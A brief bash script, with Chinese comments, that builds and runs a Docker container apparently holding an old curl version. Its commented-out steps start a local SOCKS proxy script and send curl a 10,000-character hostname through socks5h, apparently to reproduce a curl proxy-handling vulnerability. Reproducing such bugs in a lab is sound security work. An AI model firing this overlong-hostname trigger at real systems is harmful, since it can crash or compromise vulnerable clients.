#!/bin/bash

docker build . -t curl774

docker run --rm -it --net="host" -t curl774

# 在容器内运行 Python 文件
# python3 /build/mysocks.py

# # 使用 Curl 进行请求
# curl -vvv -x socks5h://localhost:1080 $(python3 -c "print(('A'*10000), end='')")

